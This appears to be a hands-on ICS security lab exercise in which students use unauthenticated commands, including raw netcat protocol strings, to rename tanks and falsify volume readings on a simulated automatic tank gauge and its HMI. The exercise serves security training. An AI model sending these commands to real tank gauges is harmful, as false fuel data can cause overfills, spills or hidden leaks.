# Exercise 3: ATG Manipulation

## The Situation

You can read data from the ATG. But can you write to it? If the protocol allows unauthenticated reads, maybe it allows writes too.

This is where things get interesting from a security perspective.

---

## What You'll Learn

- How to modify ATG data without authentication
- The immediate impact of data manipulation
- Why lack of authentication is a critical vulnerability

---

## Tasks

### 1. Record the Baseline

Before changing anything, document the current state of Tank 1:

```bash
python3 tools/atg_client.py inventory | head -15
```

Write down (or screenshot) the current values for Tank 1.

### 2. Change the Tank Name

The `S6020x` command changes tank names. Let's try it:

```bash
python3 tools/atg_client.py set-name 1 "COMPROMISED"
```

### 3. Verify the Change

Did it work?

```bash
python3 tools/atg_client.py inventory | head -15
```

Look at Tank 1's product name. If you see "COMPROMISED" - you just modified operational data without any authentication.

### 4. Check the HMI

Open the HMI dashboard in your browser:

```
http://localhost:5000
```

Find Tank 1. Does it show the new name? The HMI polls the ATG every few seconds, so you might need to wait a moment.

### 5. Modify Volume Readings

Tank names are one thing. What about actual measurements?

```bash
python3 tools/atg_client.py set-volume 1 99999
```

This tells the ATG that Tank 1 now contains 99,999 units. Check the inventory:

```bash
python3 tools/atg_client.py inventory | head -15
```

Refresh the HMI dashboard. Watch the tank visualization - it probably looks ridiculous now, showing way more than 100% capacity.

### 6. Try Zero

What happens if we report the tank as empty?

```bash
python3 tools/atg_client.py set-volume 1 0
```

Check the HMI again. An operator seeing this might think there's a major leak or that deliveries stopped.

### 7. Clean Up

Let's restore reasonable values before continuing:

```bash
python3 tools/atg_client.py set-name 1 "NG-MAIN"
python3 tools/atg_client.py set-volume 1 38000
```

---

## Think About It

You just demonstrated that anyone with network access can:
- Change how tanks are labeled
- Manipulate volume readings
- Potentially trigger (or hide) alarm conditions

No credentials. No logging. No alerts.

Consider:
- What decisions might operators make based on false data?
- Could manipulated readings cause safety issues?
- How would anyone know the data was tampered with?

---

## The Raw Commands

If you want to see what's happening at the protocol level:

```bash
# Change tank 1 name (S60201 = set tank 1, followed by name)
echo -e '\x01S60201HACKED\n' | nc localhost 10001

# Change tank 1 volume (S60210:tank:value)
echo -e '\x01S60210:1:12345\n' | nc localhost 10001
```

No response is returned for write commands - they just execute silently.

---

## What's Next

We've manipulated the ATG directly. But operators don't usually talk to ATGs - they use the HMI. Let's explore that interface.

Continue to [Exercise 4: HMI Reconnaissance](E04_HMI_RECONNAISSANCE.md)

---

## Notes

**Safety Note**: In a real facility, manipulated ATG data could lead to overfills, spills, or incorrect safety responses. This is why ICS security matters.

**Real World**: In 2015, researchers found they could remotely manipulate ATGs at actual gas stations. The commands are identical to what you just used.
